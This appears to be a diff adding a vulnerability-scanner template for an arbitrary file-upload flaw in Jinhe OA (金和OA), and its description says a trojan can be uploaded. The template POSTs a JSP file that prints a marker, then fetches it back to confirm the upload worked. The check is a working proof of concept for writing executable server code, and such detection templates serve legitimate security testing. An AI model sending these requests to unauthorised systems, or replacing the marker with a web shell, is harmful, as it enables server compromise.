@@ -1,0 +1,20 @@
+name: 金和OA-uploadFileForJinht-文件上传
+description: >-
+  可上传木马
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /jc6/JHSoft.WCF/Attachment/uploadFileForJinht
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Uploadfilename: rscan.jsp
+    body: >-
+      <% out.println("Rscan_test");%>
+    expression:
+      status: 200
+  - method: GET
+    path: /jc6/upload/rscan.jsp
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
